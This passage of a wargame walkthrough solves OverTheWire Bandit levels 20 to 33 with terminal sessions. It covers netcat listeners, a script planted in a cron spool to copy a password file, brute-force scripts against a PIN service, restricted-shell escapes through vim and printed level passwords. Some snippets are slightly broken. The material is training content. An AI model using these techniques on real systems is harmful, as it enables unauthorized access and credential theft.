  - If the password is correct, it will transmit the password for the next level (bandit21).

- NOTE: To beat this level, you need to login twice:
  - once to run the setuid command,
  - and once to start a network daemon to which the setuid will connect.
- NOTE 2: Try connecting to your own network daemon to see if it works as you think

finding a way for us to listen to a port without setting up an entire service that we don’t need.

`nc`: is able to go create a simple connection to pass data between two hosts on a port.
`-l`: the option for listening mode
1025: the first port outside of the well known 1024.

Now lets see what happens when we connect to that port with another session, please note that the sessions have to be running simultaneously of this to work.

```py
A:
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ nc -lp 1025
# GbKksEFF4yrVs6il55v6gwY5aVje5f0j           # send the txt to port 1025

B:
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ ./suconnect 1025         # received the sent txt
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password

A:
bandit20@bandit:~$ nc -lp 1025
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr

-----------------------------------------------------------
A:
bandit20@bandit:~$ ls
suconnect
bandit20@bandit:~$ nc -lp 32123 < /etc/bandit_pass/bandit20

B:
bandit20@bandit:~$ ./suconnect 32123
# Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
# Password matches, sending next password

A:
bandit20@bandit:~$ nc -lp 32123 < /etc/bandit_pass/bandit20
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```

---

## Bandit Level 21 → Level 22 `bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null`
Level Goal
- A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

```py
$ cd /etc/cron.d
$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
# this script is set to run every minute of every hour of every day of the every month and every day of the week.
# If this had been a resource intense one like a backup across a network it could cause some serious problems.

$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
# first script: changes the file permissions of a file in the /tmp/ to enable the read and write permission for the user, and read permission for the group and everyone else.
# /tmp is similar to the temp file folder in Windows, it’s used to create random directory and file names for use in programs and scripts.
# The second line script: reads the file bandit22 in the /etc/bandit_pass/ and then uses (>): used to write text from one file to another, so the file bandit22 is essentially being copied to the /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv file.
# If we wanted to write more than one file to a file we would have to add another of the brackets like so >>, this tells the shell that instead of writing over the file to add them to the bottom of the file. This technique is mostly used to write outputs to logs that otherwise would go to the standard output.

$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```

---

## Bandit Level 22 → Level 23 `reverse the sh file, name-hash-file-cat file`
Level Goal
- A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: Looking at shell scripts written by other people is a very useful skill. The script for this level is intentionally made easy to read. If you are having problems understanding what it does, try executing it to see the debug information it prints.

For example, say we want to write a script that will square whatever number we pass to the script. We need a way to tell the script to deal with whatever number we put in and multiply it by itself. The way we accomplish this is by creating variables. The variable like in algebra is just a representative of something else that we will decide later. When writing scripts we denote variables by naming it whatever you like, usually something descriptive, and then a dollar sign followed by whatever you want your variable to be.

```py
bandit22@bandit:~$ cd /etc/cron.d/
bandit22@bandit:/etc/cron.d$ ls
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24

bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null

bandit22@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget

# In our example above the author of this script
- the variable myname is the output of the whoami command, which returns the current user name.
- the mytarget is creating an md5 hashsum of the text “I am user $currentuser”.
  - A hash sum is a fixed length output that is a function of the input.
  - the hash function analyzes the input in our example below the text fox, then the hash function outputs a string of text that represents the text fox.
- The outputs are unique with the md5 sum function.

# output that the script is copying the password for the level and to a file in the temp folder.
bandit22@bandit:/etc/cron.d$ /usr/bin/cronjob_bandit23.sh
Copying passwordfile /etc/bandit_pass/bandit22 to /tmp/8169b67bd894ddbb4412f91573b38db3
# the problem is we already have the password for bandit22

# the script is taking our username (using the whoami) command and putting it into a string which is being hashed. The hash of the string is being used to denote a filename in /tmp/ where the password is.
# If we want the password for bandit23 let’s see what’s in the file that’s named the hash of the string “I am user bandit23”.
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349

bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe813263
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```

---

## Bandit Level 23 → Level 24 `cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass`
Level Goal
- A program is running automatically at regular intervals from `cron`, the time-based job scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being executed.
- NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
- NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

```py
bandit23@bandit:/etc/cron.d$ ls
atop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24

bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
      echo "Handling $i"
	    timeout -s 9 60 ./$i
	    rm -f ./$i      # ./$i means each file will be executed and the ‘rm -f $i’ will force remove it.
    fi
done
```

What does this mean to us?
- a script that is running commands at the `user permission level of Bandit24`.
  - That means that we could possibly inject our own script to be run if we put a script of our own into the `/var/spool/bandit24` directory.
- the password was stored in `/etc/bandit_pass/` so bandit24 password is there as well


- `/var/spool/cron/` 这个目录下存放的是每个用户包括root的`crontab`任务
  - 每个任务以创建者的名字命名，tom建的crontab任务文件就是/var/spool/cron/tom。
  - 一般一个用户最多只有一个crontab文件。
- 我们在`/var/spool/bandit24`目录下就可以运行`bandit24`的定时任务
- 创建一个放在改目录下的脚本就可以执行了
- `vim getpass.sh`进入vim编辑模式输入脚本
- 写入 `cat /etc/bandit_pass/bandit24 > /tmp/bandit24pass`
- `：wq`保存退出

```py
# go ahead and create a temporary directory.

# bandit23@bandit:/var/spool/bandit24$ vim getpass
# bandit23@bandit:/var/spool/bandit24$ chmod 777 getpass

bandit23@bandit:/etc/cron.d$ mkdir /tmp/grace44
bandit23@bandit:/etc/cron.d$ cd /tmp/grace44
bandit23@bandit:/tmp/grace44$ nano

# open Nano we will go ahead and write script to inject:

#!/bin/bash
cat /etc/bandit_pass/bandit24 > tmp/jhalon/pass
# reading the contents of the bandit24 password file (/etc/bandit_pass/bandit24)
# and sending its output into a file that our bandit23 user account can see. (tmp/jhalon/pass)
#Save this new script as script.sh.


$ chmod 777 script.sh
# make our script executable by bandit24. 777 is excessive for permissions
# can also chmod -R 777 your tmp file in order to ls your files if you’re finding not listing your directory to be irritating.


$ cp script.sh /var/spool/bandit24
# copy script into the /var/spool/bandit24 folder.

# Give it a minute to allow the cron job to run and then cat the file you specified as output.
$ dir -a
.  ..  pass  script.sh
$ cat /tmp/jhalon/pass
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

---

## Bandit Level 24 → Level 25 `nc localhost port password pin`
Level Goal
- A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, `brute-force`.

- Objective
  - Brute force the server listening on port 30002 using the password for Bandit 24.

list of general steps for this challenge/script.
  - Connect to the service
  - Send a password + pin combo (Script and `automate this process`)
  - Evaluate the results

1. go ahead and write a `Bash Script` to Brute Force the PIN while attempting a connection.

`echo UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 1001 | nc localhost 30002 >> result &`

```py

#!/bin/bash
password24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {0000..9999}
  do
    echo $password24 $i >> passlist.txt
  done

# generated the passlist.txt with the password and 0000 for example:
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
...

# cat this file into nc and let it run
cat passlist.txt | nc localhost 30002


-----------------------------------------------------


#!/bin/bash
passwd="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
for a in {0000-10000};
  do
    echo $passwd $a | nc localhost 30002 >> result &
  done

# put in result and search
# but actually it cannot loop
# need troubleshoott
bandit24@melinda:/tmp/jhalon$ chmod 755 script.sh
bandit24@melinda:/tmp/jhalon$ ./script.sh
bandit24@melinda:/tmp/jhalon$ sort result | uniq -u
Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```



2.
```py
import socket

pin = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 30002))
s.recv(1024)

while True:
#  print ' [Heart] Sending Pin: ' + str(pin)
  s.sendall(password+' '+str(pin)+'\n')
  data=s.recv(1024)
#  print data

  if "Fail" in data:
     print data
     exit(0)
  elif "Wrong" in data:
     print "wrong Pincode: " + str(pin)
  else:
     print "Got Pincode: " + str(pin)
     print data
     exit(0)
  pin +=1

# results
[+] Sending Pin: 3710
[+] Sending Pin: 3711
```

- First import the socket library, socket is required to make network connections.
- Then initialize the `pin` variable with a 0 and set my `password` variable.
- Next establish an object called `s` which sets up my socket.
  - use the `socket` object and have it `connect to ‘localhost’ on port ‘30002’` and then using `s.recv(1024)` accept the `banner`.
  - So far this just established the connection to the service. Now we enter a while loop to brute force the password.

- The while loop simply prints the pin it will attempt.
- `s.sendall()` sends the `password` and `pin` through the socket. Note the `\n` as the last argument to the function, this is required because it tells the service that you’re done entering a line, without it the script will hang.
- Finally we capture the data returned from the server, print it and increase the pin by one. Then it starts all over.

- more feature rich: evaluate a condition to determine if the return from the service had “Wrong!” in it:
  - if so, continue the script.
  - If not, stop and say ‘Pin Found!’.
  - Luckily for me that was not needed because the service resets the connection when the correct pin is presented and thus the script stops.

Note: It’s been pointed out that my while loop is an infinity loop. I know, I could have just used a for loop and that’s a better method of doing it. I was planning on putting in error handling + conditionals but it wasn’t necessary.


3.
根据python的pwntools写个脚本跑密码就好了
- 在其他目录下没有写权限，这个脚本只能在/tmp目录下创建。
- 如果用的是我下面这种receive line方法，有些破坏输出的结果我要多接收一行过滤掉，

```py
$ nano /tmp/conn.py

#！ /usr/bin/python
from pwn import *

conn = remote('localhost', '30002')
badline = conn.recvline()
for i in range(1000):
    tmp = str(i).zfill(4)
    print '[+] Trying pincode: ' + str(tmp)
    conn.sendline('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + tmp)
    response = conn.recvline()
    print response

    if "Wrong" not in response:
       print "Got Pincode: " + str(tmp)
       response = conn.recvline()
       print response
       exit(0)

# 终端运行
python /tmp/conn.py
...
[+] Trying pincode: 0377
Wrong! Please enter the correct pincode. Try again.
[+] Trying pincode: 0378
Correct!
Got Pincode: 0378
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

```

4.
```py
#!/usr/bin/python
from pwn import *
from multiprocessing import Process

def brute(nrOne,nrTwo):
    for pin in range(nrOne,nrTwo):
        pin = str(pin).zfill(4)

        r = remote('localhost', 30002)
        r.recv()
        r.send('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + pin + '\n')

        if 'Wrong' not in r.recvline():
            print '[+] Successful -> ' + pin
            print r.recvline()
            r.close()
        else:
            if int(pin) % 100 == 0:
                print '[!] Failed -> ' + pin
            r.close()

if __name__=='__main__':
    p1 = Process(target = brute, args = (0,2500,))
    p2 = Process(target = brute, args = (2500,5000,))
    p3 = Process(target = brute, args = (5000,7500,))
    p4 = Process(target = brute, args = (7500,10000,))
    p1.start()
    p2.start()
    p3.start()
    p4.start()
```

started the brute function four times and assigned a pincode range to each process to speed up the task. After a short time the password for the next level appears.
- `SILENT=1` disables the `pwntools` output that appears every time a connection is established or closed.

---

## Bandit Level 25 → Level 26 `in move window use v to enter vim, :e /etc/bandit_pass/bandit26`
Level Goal
- Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not `/bin/bash`, but something else. Find out what it is, how it works and how to break out of it.

```py
# uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

# 家目录上面有一个bandit26.sshkey,
bandit25@bandit:~$ ls
bandit26.sshkeyhkey

bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? n
Please type 'yes' or 'no': no
Host key verification failed.
bandit25@bandit:~$

# 用这个私钥文件去连接远程的主机, ssh -i bandit26.sshkey bandit26@localhost
# 发现连接直接被远程关闭了，加上-T 参数也没有用

# 题目也提示说这个用的是其他shell
bandit25@melinda:~$ ls -a
.   .bandit24.password  .bashrc  .profile
..  .bash_logout        .pin     bandit26.sshkey

# 查看其某用户用的什么shell 可以查看/etc/passwd。
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext

$ cat /etc/passwd | grep bandit26
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
# bandit26用户用到的shell就是/usr/bin/showtext

$ cat /usr/bin/showtext
#!/bin/sh
export TERM=linux
more ~/text.txt
exit 0

# 系统关闭连接的原因是这个exit 0
# 在这个exit 之前执行想要的命令
The more command is used to open the file text.txt.
more is useful to display long (text) files on small screens or in a size limited terminal window - similar to the less command, but with much fewer functions.
resize the currently terminal window to so small to enter the more environment.
# 在 more 命令执行之前可以执行命令即可，把会话的终端缩小，
# 用 ssh -i bandit26.sshkey bandit26@localhost > yes，自动more
# 在 more 命令还没有结束的时候按v进入vim编辑模式。

进入vim编辑模式。

1. :e /etc/bandit_pass/bandit26     # 导入文件到编辑器内，
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

2. :r /etc/bandit_pass/bandit26     # 读入另一个档案的数据
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

2. start a shell.
- Type in :set shell=/bin/bash
- and type in :shell
- This will spawn a bash shell and allow us to get the password for this level.

:shell
[No write since last change]
bandit26@bandit:~$
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```

`bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext`
- passwd文件格式:
  - 账号名称：即登陆时的用户名
  - 密码：早期UNIX系统的密码是放在这个文件中的，但因为这个文件的特性是所有程序都能够读取，所以，这样很容易造成数据被窃取，因此后来就将这个字段的密码数据改放到/etc/shadow中了
  - UID：用户ID，每个账号名称对应一个UID，通常UID=0表示root管理员
  - GID：组ID，与/etc/group有关，/etc/group与/etc/passwd差不多，是用来规范用户组信息的
  - 用户信息说明栏： 用来解释这个账号是干什么的
  - 家目录：home目录，即用户登陆以后跳转到的目录，以root用户为例，/root是它的家目录，所以root用户登陆以后就跳转到/root目录这里
  - Shell：用户使用的shell，通常使用/bin/bash这个shell，这也就是为什么登陆Linux时默认的shell是bash的原因，就是在这里设置的，如果要想更改登陆后使用的shell，可以在这里修改。另外一个很重要的东西是有一个shell可以用来替代让账号无法登陆的命令，那就是/sbin/nologin。

---

## Bandit Level 26 → Level 27 `:set shell=/bin/bash, :shell`
Level Goal
- Good job getting a shell! Now hurry and grab the password for bandit27!

使用密码ssh登陆之后也是直接断开了，跟上一关一样
- 进入more模式，
- 利用vim模式执行命令，
- 不能用:e来读取文件bandit27-do，因为权限不够。
- !command也不行，!sh也不行，

vim还有一种需要先设置shell的目录才行
2. start a shell.
- Type in `:set shell=/bin/bash`
- and type in `:shell`
- This will spawn a bash shell and allow us to get the password for this level.

:shell
[No write since last change]
bandit26@bandit:~$
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z


```py
# 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

bandit26@bandit:~$ ls
bandit27-do  text.txt

bandit26@bandit:~$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id

bandit26@bandit:~$ ./bandit27-do id
uid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)
# bandit27 can open This

bandit26@bandit:~$ cat /etc/bandit_pass/bandit27
cat: /etc/bandit_pass/bandit27: Permission denied

bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
3ba3118a22e93127a4ed485be72ef5ea
```

---

## Bandit Level 27 → Level 28  `git clone ssh:url`
Level Goal
- There is a git repository at `ssh://bandit27-git@localhost/home/bandit27-git/repo`. The password for the user `bandit27-git` is the same as for the user `bandit27`.

Clone the repository and find the password for the next level.

这题是主要是克隆项目的命令，直接在当前目录是新建不了新文件的，所以我们在临时目录下创建目录即可，具体步骤如下，发现这个项目的里面的README就是存储的的密钥


```py
bandit27@bandit:~$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
fatal: could not create work tree dir 'repo': Permission denied

bandit27@bandit:~$ mkdir /tmp/grace66
bandit27@bandit:~$ cd /tmp/grace66

bandit27@bandit:/tmp/grace66$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repoCloning into 'repo'...
Could not create directory '/home/bandit27/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' cant be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit27-git@localhosts password: # 3ba3118a22e93127a4ed485be72ef5ea
remote: Counting objects: 3, done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0)
Receiving objects: 100% (3/3), done.

bandit27@bandit:/tmp/grace66$ ls
repo
bandit27@bandit:/tmp/grace66$ ls -la
...
drwxr-sr-x 3 bandit27 root      4096 Feb 17 20:11 repo

bandit27@bandit:/tmp/grace66$ cd repo
bandit27@bandit:/tmp/grace66/repo$ ls -la
...
-rw-r--r-- 1 bandit27 root   68 Feb 17 20:11 README

bandit27@bandit:/tmp/grace66/repo$ cat README
The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
```

---

## Bandit Level 28 → Level 29 `git log, git diff logNum1 logNum2`
Level Goal
There is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo. The password for the user bandit28-git is the same as for the user bandit28.

Clone the repository and find the password for the next level.


```py
# 0ef186ac70e04ea33b4c1853d2526fa2

bandit28@bandit:~$ mkdir /tmp/grace88
bandit28@bandit:~$ cd /tmp/grace88
bandit28@bandit:/tmp/grace88$
bandit28@bandit:/tmp/grace88$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repoCloning into 'repo'...

bandit28@bandit:/tmp/grace88$ cd repo
bandit28@bandit:/tmp/grace88/repo$ ls -la
...
-rw-r--r-- 1 bandit28 root  111 Feb 17 20:16 README.md

bandit28@bandit:/tmp/grace88/repo$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.
## credentials
- username: bandit29
- password: xxxxxxxxxx

# git log查看提交历史，
$ git log
commit 073c27c130e6ee407e12faad1dd3848a110c4f95
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    fix info leak

commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    add missing data

commit b67405defc6ef44210c53345fc953e6a21338cc7
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 16 14:00:39 2018 +0200

    initial commit of README.md

# 然后对应版本提交id, 查找区别，得出密码。
$ git diff 073c27c130e6ee407e12faad1dd3848a110c4f95 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
diff --git a/README.md b/README.md
index 5c6457b..3f7cee8 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 - username: bandit29
-- password: xxxxxxxxxx
+- password: bbc96594b4e001778eee9975372716b2

$ git diff 186a1038cc54d1358d42d468cdc8e3cc28a93fcb b67405defc6ef44210c53345fc953e6a21338cc7
diff --git a/README.md b/README.md
index 3f7cee8..7ba2d2f 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials
 - username: bandit29
-- password: bbc96594b4e001778eee9975372716b2
+- password: <TBD>
```

---

## Bandit Level 29 → Level 30 `git branch -a, git checkout branchName`
Level Goal
- There is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo. The password for the user bandit29-git is the same as for the user bandit29.
- Clone the repository and find the password for the next level.

```py
# bbc96594b4e001778eee9975372716b2

$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo
Cloning into 'repo'...
bandit29-git@localhosts password: # bbc96594b4e001778eee9975372716b2
Resolving deltas: 100% (2/2), done.

$ cd repo
$ git show
commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8
...
-- username: bandit29
+- username: bandit30
 - password: <no passwords in production!>

$ git branch -a
* master
  remotes/origin/HEAD -> origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev

$ git checkout dev
Branch dev set up to track remote branch dev from origin.
Switched to a new branch 'dev'

$ git log
commit 33ce2e95d9c5d6fb0a40e5ee9a2926903646b4e3
Author: Morla Porla <morla@overthewire.org>
Date:   Tue Oct 16 14:00:41 2018 +0200
    add data needed for development      # 最新的版本里面有个data needed for development
commit a8af722fccd4206fc3780bd3ede35b2c03886d9b
Author: Ben Dover <noone@overthewire.org>
Date:   Tue Oct 16 14:00:41 2018 +0200
    add gif2ascii
...

$ ls
code  README.md
$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.
## credentials
- username: bandit30
- password: 5b90576bedb2cc04c86a9e924ce42faf
```

---

## Bandit Level 30 → Level 31 `git show-ref`
Level Goal
- There is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo. The password for the user bandit30-git is the same as for the user bandit30.

```py
5b90576bedb2cc04c86a9e924ce42faf

bandit30@bandit:/tmp/grace30/repo$ ls
README.md
bandit30@bandit:/tmp/grace30/repo$ cat README.md
just an empty file... muahaha
bandit30@bandit:/tmp/grace30/repo$ git show
..
@@ -0,0 +1 @@
+just an empty file... muahaha

# git show-ref可以现实本地存储库的所有可用的引用以及关联的提交ID
$ git show-ref
3aa4c239f729b07deb99a52f125893e162daac9e refs/heads/master
3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/HEAD
3aa4c239f729b07deb99a52f125893e162daac9e refs/remotes/origin/master
f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secret

$ git show f17132340e8ee6c159e0a4a6bc6f80e1da3b1aea
47e603bb428404d265f59c42920d81e5
```

---

## Bandit Level 31 → Level 32 `git add -f file, git status, git commit '...'/'addfile', git push origin master`
Level Goal
- There is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo. The password for the user bandit31-git is the same as for the user bandit31.

Clone the repository and find the password for the next level.


```py
# 47e603bb428404d265f59c42920d81e5

bandit31@bandit:~$ cat .gitconfig
[user]
	email = bandit31@overthewire.org
	name = bandit31


bandit31@bandit:/tmp/grace31/repo$ cat README.md
This time your task is to push a file to the remote repository.
Details:
    File name: key.txt
    Content: 'May I come in?'
    Branch: master

bandit31@bandit:/tmp/grace31/repo$ echo 'May I come in?' > key.txt
bandit31@bandit:/tmp/grace31/repo$ ls
key.txt  README.md

bandit31@bandit:/tmp/grace31/repo$ git add key.txt
The following paths are ignored by one of your .gitignore files:
key.txt
Use -f if you really want to add them.
bandit31@bandit:/tmp/grace31/repo$ git add -f key.txt

bandit31@bandit:/tmp/grace31/repo$ git status
On branch master
Your branch is ahead of 'origin/master' by 3 commits.
  (use "git push" to publish your local commits)
Changes to be committed:
  (use "git reset HEAD <file>..." to unstage)

	new file:   key.txt


bandit31@bandit:/tmp/grace31/repo$ git commit -m 'add key2.txt' # the same
bandit31@bandit:/tmp/grace31/repo$ git commit -m '...'
[master 71da273] ...
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt

bandit31@bandit:/tmp/grace31/repo$ git push
bandit31-git@localhosts password:  # 47e603bb428404d265f59c42920d81e5
Counting objects: 7, done.
Delta compression using up to 4 threads.
Compressing objects: 100% (5/5), done.
Writing objects: 100% (7/7), 678 bytes | 0 bytes/s, done.
Total 7 (delta 1), reused 0 (delta 0)
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: 56a9bf19c63d650ce78e6ec0354ee45e
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: fatal: Path 'key.txt' does not exist in '0df0d8d572f99c8d76ee12b9b8c74b6016ba0b31'
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Wrong!
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'
bandit31@bandit:/tmp/grace31/repo$
```

---

## Bandit Level 32 → Level 33 `$0`
- After all this git stuff its time for another escape. Good luck!

```py
# 56a9bf19c63d650ce78e6ec0354ee45e

$0进入正常终端

WELCOME TO THE UPPERCASE SHELL
>> $0
$ ls
uppershell
$ whoami      # always check who u are first!!!
bandit33
$ cat /etc/bandit_pass/bandit33
c9c3199ddf4121b10cf581a98d51caee
```

---

## Bandit Level 33 → Level 34
- At this moment, level 34 does not exist yet.











.
